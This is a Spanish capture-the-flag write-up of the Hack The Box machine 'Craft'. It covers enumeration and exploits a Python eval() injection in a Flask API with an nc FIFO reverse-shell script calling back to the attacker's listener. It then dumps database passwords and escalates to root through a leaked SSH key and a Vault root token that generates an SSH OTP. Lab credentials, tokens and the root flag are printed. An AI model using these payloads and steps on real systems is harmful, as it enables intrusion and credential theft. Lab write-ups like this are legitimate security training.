---
tags:
title: Craft - Medium (HTB)
permalink: /Craft-HTB-Writeup
toc: true
toc_label: Topics
toc_sticky: true
sidebar: main
---
---
# Reconocimiento

```bash
nmap -sCV -p22,443,6022 10.129.248.57                                                                                                                                
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-29 13:20 -03
Nmap scan report for craft.htb (10.129.248.57)
Host is up (0.68s latency).

PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
| ssh-hostkey: 
|   2048 bd:e7:6c:22:81:7a:db:3e:c0:f0:73:1d:f3:af:77:65 (RSA)
|   256 82:b5:f9:d1:95:3b:6d:80:0f:35:91:86:2d:b3:d7:66 (ECDSA)
|_  256 28:3b:26:18:ec:df:b3:36:85:9c:27:54:8d:8c:e1:33 (ED25519)
443/tcp  open  ssl/http nginx 1.15.8
| tls-nextprotoneg: 
|_  http/1.1
|_http-title: About
| ssl-cert: Subject: commonName=craft.htb/organizationName=Craft/stateOrProvinceName=NY/countryName=US
| Not valid before: 2019-02-06T02:25:47
|_Not valid after:  2020-06-20T02:25:47
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|_  http/1.1
|_http-server-header: nginx/1.15.8
6022/tcp open  ssh      Golang x/crypto/ssh server (protocol 2.0)
| ssh-hostkey: 
|_  2048 5b:cc:bf:f1:a1:8f:72:b0:c0:fb:df:a3:01:dc:a6:fb (RSA)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 79.34 seconds
```

# Service enumeration

Como vemos que en puerto `443` corre un servicio web, necesitamos hacer que el la `ip` de la maquina resuelva correctamente al dominio de la misma, el cual es `craft.htb`, para eso lo agregamos al `/etc/hosts`.

```bash
sudo echo -e '10.129.248.57\t\craft.htb' | sudo tee -a /etc/hosts
```
## HTTPs - SSL / Port 443
	
### craft.htb 

Como podemos ver por el puerto `443` corre una aplicacion web, que por lo que habla, trata con `apis`.

![{7C56B136-A3DC-4AA5-906C-2B14E2DA100C}](images/{7C56B136-A3DC-4AA5-906C-2B14E2DA100C}.png)

Ademas, hay dos enlaces en la parte superior derecha que conducen a nuevos subdominios:` https://api.craft.htb/api/` y `https://gogs.craft.htb/`. Voy a añadir cada uno de ellos a mi archivo `hosts`.

## Fuzz Subdomains 

Debido a la existencia de dos nuevos `subdominios`, por las dudas voy a `fuzzear` por algunos otros usando un diccionario personalizado.

```bash
wfuzz -u "https://10.129.248.57" -w /usr/share/seclists/Discovery/DNS/subdomains-top1mil-20000.txt  -H "Host: FUZZ.craft.htb" --hh 3779                                                                 

********************************************************
* Wfuzz 2.3.4 - The Web Fuzzer                         *
********************************************************

Target: https://10.10.10.110/
Total requests: 19983

==================================================================
ID   Response   Lines      Word         Chars          Payload
==================================================================

000051:  C=404      4 L       34 W          233 Ch        "api"
005943:  C=404      1 L        4 W           19 Ch        "vault"

Total time: 432.5084
Processed Requests: 19983
Filtered Requests: 19981
Requests/sec.: 46.20256
```

Los agrego al /etc/hosts

```bash
10.129.248.57 craft.htb api.craft.htb gogs.craft.htb vault.craft.htb
```
### api.craft.htb

Esta pagina contiene una `GUI` para la `api` de la empresa

![1563168889623](images/1563168889623.webp)

## gogs.craft.htb

Ademas podemos ver que tambien hay otro subdominio el cual `gogs` esta corriendo, como un servicio de `Git`.

![{4570A8D7-9C3C-4E85-A7A8-E306C280D470}](images/{4570A8D7-9C3C-4E85-A7A8-E306C280D470}.png)

Clickando en `explore`, veo un repositorio, que al parecer es de la propia `api`.
### Explore api

![{0DFCDD3E-67CF-4B54-9E0A-EEA7C27B8BF9}](images/{0DFCDD3E-67CF-4B54-9E0A-EEA7C27B8BF9}.png)

Debido a que hay demasiadas secciones en el mismo repositorio, voy a hacer un resumen de lo mas importante.

#### settings.py

```python
import os
from flask import Flask, Blueprint
from werkzeug.contrib.fixers import ProxyFix
from craft_api import settings
from craft_api.api.auth.endpoints.auth import ns as craft_auth_namespace
from craft_api.api.brew.endpoints.brew import ns as craft_brew_namespace
from craft_api.api.restplus import api
from craft_api.database import db

app = Flask(__name__)


def configure_app(flask_app):
    flask_app.config['SERVER_NAME'] = settings.FLASK_SERVER_NAME
    flask_app.config['SWAGGER_UI_DOC_EXPANSION'] = settings.RESTPLUS_SWAGGER_UI_DOC_EXPANSION
    flask_app.config['RESTPLUS_VALIDATE'] = settings.RESTPLUS_VALIDATE
    flask_app.config['RESTPLUS_MASK_SWAGGER'] = settings.RESTPLUS_MASK_SWAGGER
    flask_app.config['ERROR_404_HELP'] = settings.RESTPLUS_ERROR_404_HELP
    flask_app.config['SQLALCHEMY_DATABASE_URI'] = 'mysql+pymysql://%s:%s@%s/%s' % ( settings.MYSQL_DATABASE_USER, settings.MYSQL_DATABASE_PASSWORD, settings.MYSQL_DATABASE_HOST, settings.MYSQL_DATABASE_DB)
    flask_app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = settings.SQLALCHEMY_TRACK_MODIFICATIONS

def initialize_app(flask_app):
    configure_app(flask_app)

    blueprint = Blueprint('api', __name__, url_prefix='/api')
    api.init_app(blueprint)
    api.add_namespace(craft_auth_namespace)
    api.add_namespace(craft_brew_namespace)
    flask_app.register_blueprint(blueprint)
    flask_app.wsgi_app = ProxyFix(app.wsgi_app)

    db.init_app(flask_app)

def main():
    initialize_app(app)
    app.run(host='0.0.0.0', port=8888, debug=settings.FLASK_DEBUG)


if __name__ == "__main__":
    main()
```

Vemos que en varias ocasiones se hace referencia a `settings`, lo cual podria indicar que exista un `settings.py` dentro del repositorio.

![1563170049593](images/1563170049593.webp)

Pero como podemos ver no existe, o esta oculto por razones de seguridad quisiera suponer.

#### Conversations

![1563170168976](images/1563170168976.png)

Vemos que en la seccion de `issues`, hay una conversacion entre los miembros del proyecto.

![1563170218453](images/1563170218453.png)

En el mismo hablan de una posible `vulnerabilidad` en cuanto a la `sanitizacion` de la base de datos de la pagina. Donde nos dejan una miga

```bash
curl -H 'X-Craft-API-Token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoidXNlciIsImV4cCI6MTU0OTM4NTI0Mn0.-wW1aJkLQDOE-GP5pQd3z_BJTe2Uo0jJ_mQ238P5Dqw' -H "Content-Type: application/json" -k -X POST https://api.craft.htb/api/brew/ --data '{"name":"bullshit","brewer":"bullshit", "style": "bullshit", "abv": "15.0")}'
```

Esto es un punto a favor ya que nos indica el uso del token y como incluirlo en una peticion. Ademas vemos que esta porcion de comando, parece ser como una solucion, para el problema que los desarrolladores estan viviendo, ya que podemos ver en un commit como es que ocurre o se evalua las peticiones.

![1563170600459](images/1563170600459.png)

Vemos que hay una declaracion `eval`, donde el mismo usuario puede controlar el input de la peticion, esto si en un problema serio. Por otro lado si nos vamos al historial del archivo, podemos ver dos `commits`. El actual y el original

#### Creds for login

![1563171230866](images/1563171230866.png)

Vemos que las credenciales son de `dinesh`, para el panel de login de `api.craft.login`.

## Shell as root@api Container

Si nos logueamos en la pagina, podemos ver el `token` del usuario `dinesh`, este mismo podemos usarlo para empezar a enviar peticiones y ver de que manera podemos tener ejecución de comandos a través de abuso de `apis`

![{BD06DB52-3209-4759-81C0-B9DA7E69E5D7}](images/{BD06DB52-3209-4759-81C0-B9DA7E69E5D7}.png)

El ejemplo de la peticion que debemos hacer ya lo tenemos en el repositorio, pero faltan algunos campos como el `id`. 

```bash
curl -H 'X-Craft-API-Token: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiZGluZXNoIiwiZXhwIjoxNzYxNzU4NTQ5fQ.Fb3Y8AFQilpQ6SooTumxTpluN3ZenhTYZRPUZ8R44PY' -H "Content-Type: application/json" -k -X POST https://api.craft.htb/api/brew/ --data "{\"id\": 1,\"name\":\"zs1n\",\"brewer\":\"hacker\", \"style\": \"flying\", \"abv\": \"12\"}"
"ABV must be a decimal value less than 1.0"
```

Ademas otra cosa no menos importante es que el token, luego de algunos minutos quede invalido debido a que podemos ver en el codifog de `auth.py`, que es donde se declara el tiempo de vida del token de `5 minutos`.

```python
token = jwt.encode({'user': auth.username, 'exp' : datetime.datetime.utcnow() + datetime.timedelta(minutes=5)}, secret)
```

### Abusing python eval

Como sabemos que nuestro input se evalua con `eval()`, podemos intentar inyectar comandos, tal como se explica de manera detallada en este [blog](https://medium.com/@nikomanousos123/exploiting-pythons-eval-function-69f8fc4074a1)
A continuacion un ejemplo de lo que se muestra en el mismo blog.
```bash
>>> import os
>>> s="os.system('whoami')"
>>> eval('%s > 1' % s)
root
False
```

Para automatizar todo el proceso `(Recoleccion del token, request, etc)`, cree este script en `bash`, que nos automatiza todo el proceso, y si funciona voy a tener mi shell en mi listener `nc`.

```bash
#!/bin/bash

# --- 1. Definir la IP y el Puerto de tu máquina de ataque (Listener) ---
LHOST="10.10.17.19"
LPORT="4444"

# --- 2. Obtener el Token (CORRECCIÓN: Sin espacios alrededor de = y usando $() ) ---
# El comando curl parece correcto para extraer solo el token.
TOKEN=$(curl -s -X GET 'https://api.craft.htb/api/auth/login' -u dinesh:4aUh0A8PbVJxgd -k | tr -d '{}' | tr ':' ' ' | tr -d '\"' | awk '{print $2}')

# Verifica que el token se haya obtenido
if [ -z "$TOKEN" ]; then
    echo "[!] ERROR: No se pudo obtener el token. Verifique las credenciales."
    exit 1
fi

echo "[+] Token obtenido: $TOKEN"

# --- 3. Definir el Payload de la Reverse Shell (CORRECCIÓN: Incluir 0.1; y ;# ) ---
# Usamos un shell tipo netcat para la reverse shell.
# El payload debe estar en una variable para evitar problemas de sintaxis de comillas.
# La sintaxis de Bash debe ser escapada (dobles comillas en el os.system).

# Payload para asegurar ejecución estable en eval('%s > 1') y una shell FIFO:
PAYLOAD="__import__('os').system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $LHOST $LPORT >/tmp/f')"

# --- 4. Crear el Cuerpo JSON (CORRECCIÓN: Asignado como una única cadena) ---
# Usamos el payload corregido y una única cadena para el body.
BODY="{\"id\": 1, \"name\": \"zs1n\", \"brewer\": \"hacker\", \"style\": \"flying\", \"abv\": \"${PAYLOAD}\"}"

# --- 5. Ejecutar la Inyección (CORRECCIÓN CRÍTICA: -X POST) ---
echo "[*] Enviando payload de Reverse Shell a: https://api.craft.htb/api/brew/"
echo "[*] Comando en el servidor: rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $LHOST $LPORT >/tmp/f"

curl -s -X POST 'https://api.craft.htb/api/brew/' \
     -k \
     -H "Content-Type: application/json" \
     -H "X-CRAFT-API-TOKEN: $TOKEN" \
     --data "$BODY"
```

Lo ejecutamos desde nuestra consola.

```bash 
./shell.sh
```

Y como podemos ver desde nuestro listener, obtenemos nuestra shell como `root`.

```bash
nc -nlvp 4444
listening on [any] 4444 ...
connect to [10.10.17.19] from (UNKNOWN) [10.129.248.57] 43057
/bin/sh: can't access tty; job control turned off
/opt/app # whoami
root
/opt/app #
```

Pero al parecer somos root en un contenedor

## Shell as gilfoyle.

### Enumeration

Dentro de la `shell` podemos ver el `settings.py` el cual no teníamos visibilidad desde el repositorio.

```bash
opt/app/craft_api # cat settings.py
# Flask settings
FLASK_SERVER_NAME = 'api.craft.htb'
FLASK_DEBUG = False  # Do not use debug mode in production

# Flask-Restplus settings
RESTPLUS_SWAGGER_UI_DOC_EXPANSION = 'list'
RESTPLUS_VALIDATE = True
RESTPLUS_MASK_SWAGGER = False
RESTPLUS_ERROR_404_HELP = False
CRAFT_API_SECRET = 'hz66OCkDtv8G6D'

# database
MYSQL_DATABASE_USER = 'craft'
MYSQL_DATABASE_PASSWORD = 'qLGockJ6G2J75O'
MYSQL_DATABASE_DB = 'craft'
MYSQL_DATABASE_HOST = 'db'
SQLALCHEMY_TRACK_MODIFICATIONS = False

```

Al parecer hay una base de datos en esta misma maquina.

```bash
/opt/app # ls
app.py     craft_api  dbtest.py  tests
```

Al parecer dentro de el archivo de base de datos, hay una `query SQL` la cual se ejecuta al momento de correr el script. 
```python
#!/usr/bin/env python

import pymysql
from craft_api import settings

# test connection to mysql database

connection = pymysql.connect(host=settings.MYSQL_DATABASE_HOST,
                             user=settings.MYSQL_DATABASE_USER,
                             password=settings.MYSQL_DATABASE_PASSWORD,
                             db=settings.MYSQL_DATABASE_DB,
                             cursorclass=pymysql.cursors.DictCursor)

try: 
    with connection.cursor() as cursor:
        sql = "SELECT `id`, `brewer`, `name`, `abv` FROM `brew` LIMIT 1"
        cursor.execute(sql)
        result = cursor.fetchone()
        print(result)

finally:
    connection.close()
```

Debido a que no tenemos la posibilidad de editar el mismo archivo podemos copiarlo a un clon, el cual va a tener la misma funcion solo que en vez de hardcodearle una `query` especifica, controlo yo mismo el `input` de la base de datos.

```python
#!/usr/bin/env python

import pymysql
import sys                              
from craft_api import settings
                                   
# test connection to mysql database
                                                               
connection = pymysql.connect(host=settings.MYSQL_DATABASE_HOST,
                             user=settings.MYSQL_DATABASE_USER,        
                             password=settings.MYSQL_DATABASE_PASSWORD,
                             db=settings.MYSQL_DATABASE_DB,         
                             cursorclass=pymysql.cursors.DictCursor)
    
try:                                   
    with connection.cursor() as cursor:                                 
        sql = sys.argv[1]
        cursor.execute(sql)       
        result = cursor.fetchall()
        print(result)
        
finally:              
    connection.close()
```

De esta manera con la libreria `argparse`, hago que el segundo argumento luego del `.py` sea la `query` la cual voy a ejecutar.
Por ejemplo suponiendo que obviamente exista la tabla `user` podamos extraer todos sus datos.

```
```bash
/opt/app # python db1.py "SELECT * from user"
[{'id': 1, 'username': 'dinesh', 'password': '4aUh0A8PbVJxgd'}, {'id': 4, 'username': 'ebachman', 'password': 'llJ77D8QFkLPQB'}, {'id': 5, 'username': 'gilfoyle', 'password': 'ZEU3N8WNM2rh4T'}]
```

Una vez que tenemos la clave de `gilfoyle`, podemos intentar loguearno via `ssh`. Pero va a fallar, sin embargo las credenciales son validas para el servicio de `gogs`

Como veo una carpeta `.ssh` , podriamos contener claves para el usuario `gilfoyle`.

![{4E33737F-2F80-4D04-A669-A5B7ED135E95}](images/{4E33737F-2F80-4D04-A669-A5B7ED135E95}.png)

Y como podemos ver hay una clave `id_rsa` para ese usuario asi que la colocamos dentro de un archivo el cual vamos a llamarlo igual y le vamos a dar permisos de lectura para que `ssh` pueda interpretarla como clave de identidad para que nosotros podamos conectarnos como ese usuario.

![{B6B24689-C093-4129-8407-945853A11EFD}](images/{B6B24689-C093-4129-8407-945853A11EFD}.png)

```bash
ssh gilfoyle@craft.htb -i id_rsa


  .   *   ..  . *  *
*  * @()Ooc()*   o  .
    (Q@*0CG*O()  ___
   |\_________/|/ _ \
   |  |  |  |  | / | |
   |  |  |  |  | | | |
   |  |  |  |  | | | |
   |  |  |  |  | | | |
   |  |  |  |  | | | |
   |  |  |  |  | \_| |
   |  |  |  |  |\___/
   |\_|__|__|_/|
    \_________/



Enter passphrase for key 'id_rsa': 
Linux craft.htb 6.1.0-12-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.52-1 (2023-09-07) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Thu Nov 16 08:03:39 2023 from 10.10.14.23
gilfoyle@craft:~$
```

## Shell as root

### Enumeration

Como podemos ver en las variabels de entorno del usuario que tenemos, vemos una direccion que apunta al puerto `8200`

```bash
gilfoyle@craft:/opt$ env
SSH_CONNECTION=10.10.17.19 34036 10.129.248.57 22
LANG=en_US.UTF-8
OLDPWD=/var
VAULT_TOKEN=f1783c8d-41c7-0b12-d1c1-cf2aa17ac6b9
XDG_SESSION_ID=167
USER=gilfoyle
PWD=/opt
HOME=/home/gilfoyle
SSH_CLIENT=10.10.17.19 34036 22
SSH_TTY=/dev/pts/0
MAIL=/var/mail/gilfoyle
TERM=xterm-256color
SHELL=/bin/bash
VAULT_ADDR=https://vault.craft.htb:8200/
SHLVL=1
LOGNAME=gilfoyle
XDG_RUNTIME_DIR=/run/user/1001
PATH=/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
_=/usr/bin/env
```

>**HashiCorp Vault** es una herramienta de gestión de secretos y acceso seguro. Su propósito principal es almacenar, gestionar y controlar de manera segura el acceso a información sensible, como claves de API, contraseñas, certificados y tokens de acceso. 
  En lugar de que los desarrolladores o las aplicaciones almacenen estos secretos directamente en el código o en archivos de configuración no seguros (lo que se conoce como "secrets sprawl"), Vault centraliza su gestión.

Como podemos ver en el directorio personal de golfoyle, esta el token con el que nos podemos autenticar con vault

```bash
gilfoyle@craft:/opt$ ls -la /home/gilfoyle/
total 36
drwx------ 4 gilfoyle gilfoyle 4096 Feb  9  2019 .
drwxr-xr-x 3 root     root     4096 Feb  9  2019 ..
-rw-r--r-- 1 gilfoyle gilfoyle  634 Feb  9  2019 .bashrc
drwx------ 3 gilfoyle gilfoyle 4096 Feb  9  2019 .config
-rw-r--r-- 1 gilfoyle gilfoyle  148 Feb  8  2019 .profile
drwx------ 2 gilfoyle gilfoyle 4096 Feb  9  2019 .ssh
-r-------- 1 gilfoyle gilfoyle   33 Oct 29 12:19 user.txt
-rw------- 1 gilfoyle gilfoyle   36 Oct 29 15:16 .vault-token
-rw------- 1 gilfoyle gilfoyle 2546 Feb  9  2019 .viminfo
```

Que si lo miramos el contenido del archivo contienen el siguiente token:

```bash
f1783c8d-41c7-0b12-d1c1-cf2aa17ac6b9
```

Una vez tenemos el token podemos empezar a buscar donde esta, si es que esta, el binario de `vault`.

```bash
gilfoyle@craft:/opt$ which vault
/usr/local/bin/vault
```

Ahora que sabemos donde se ubica, podemos usar el mismo token como clave de ingreso, y para loguearnos.

```bash
gilfoyle@craft:/opt$ vault login
Token (will be hidden): 
WARNING! The VAULT_TOKEN environment variable is set! This takes precedence
over the value set by this command. To use the value set by this command,                                                                                                                  
unset the VAULT_TOKEN environment variable or set it to the token displayed                                                                                                                
below.                                                                                                                                                                                     
                                                                                                                                                                                           
Success! You are now authenticated. The token information displayed below
is already stored in the token helper. You do NOT need to run "vault login"
again. Future Vault requests will automatically use this token.

Key                  Value
---                  -----
token                f1783c8d-41c7-0b12-d1c1-cf2aa17ac6b9
token_accessor       1dd7b9a1-f0f1-f230-dc76-46970deb5103
token_duration       ∞
token_renewable      false
token_policies       ["root"]
identity_policies    []
policies             ["root"]
```

Una vez nos logueamos podemos empezar a enumerar con el comando `list`, datos o secretos.

```bash
gilfoyle@craft:/opt$ vault secrets list
Path          Type         Accessor              Description
----          ----         --------              -----------
cubbyhole/    cubbyhole    cubbyhole_ffc9a6e5    per-token private secret storage
identity/     identity     identity_56533c34     identity store
secret/       kv           kv_2d9b0109           key/value secret storage
ssh/          ssh          ssh_3bbd5276          n/a
sys/          system       system_477ec595       system endpoints used for control, policy and debugging
```

En el mismo vemos un secreto de `ssh`. Pero si miramos no vemos nada.

```bash
gilfoyle@craft:/opt$ vault list ssh/
No value found at ssh/
```

Pero aun asi podemos listar roles dentro del mismo 

```bash
gilfoyle@craft:/opt$ vault list ssh/roles
Keys
----
root_otp
```

Como vemos `root_otp` es un rol que se configuro dentro del motor de secretos de `Vault`. Ahora con `read`, podemos ver para que privilegios se otorgan, en donde vemos que `n/a` ahce alusion a que no hay exactamente un usuario definido lo cual el rol se limita a `defaul_user`, que en este caso somos nosotros.

```bash
ilfoyle@craft:/opt$ vault read ssh/roles/root_otp
Key                  Value
---                  -----
allowed_users        n/a
cidr_list            0.0.0.0/0
default_user         root
exclude_cidr_list    n/a
key_type             otp
port                 22
```

Ya en este punto puedo generar un `OTP` para root, la cual la puedo usar para conectarme como el mismo por `ssh` usando de clave el mismo token que me da como output.

```bash
vault write ssh/creds/root_otp ip=10.129.248.57
Key                Value
---                -----
lease_id           ssh/creds/root_otp/bc023e60-08ea-0a22-d512-bd81cd7bf9f9
lease_duration     768h
lease_renewable    false
ip                 10.129.248.57
key                0b641d95-98a6-639a-2bbe-c6745cd8b45d
key_type           otp
port               22
username           root
```

Como podemos ver tenemos el token en texto claro, ahora solo nos queda conectarnos

```bash
sudo ssh root@10.129.248.57                       
[sudo] password for zsln: 
The authenticity of host '10.129.248.57 (10.129.248.57)' can''t be established.
ED25519 key fingerprint is SHA256:6YHCmnolQeiTfnasNpMU+6khwaMhPljTIA+eInI9hEo.
This host key is known by the following other names/addresses:
    ~/.ssh/known_hosts:127: [hashed name]
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.129.248.57' (ED25519) to the list of known hosts.


  .   *   ..  . *  *
*  * @()Ooc()*   o  .
    (Q@*0CG*O()  ___
   |\_________/|/ _ \
   |  |  |  |  | / | |
   |  |  |  |  | | | |
   |  |  |  |  | | | |
   |  |  |  |  | | | |
   |  |  |  |  | | | |
   |  |  |  |  | \_| |
   |  |  |  |  |\___/
   |\_|__|__|_/|
    \_________/



(root@10.129.248.57) Password: 
Linux craft.htb 6.1.0-12-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.52-1 (2023-09-07) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Thu Nov 16 07:14:50 2023
root@craft:~# whoami
root
```

Y ahora si podemos ver la ultima flag.

```bash
root@craft:~# cat /root/root.txt 
47b172a1d276c877d512746ce293b3cb
```

`~Happy Hacking.`
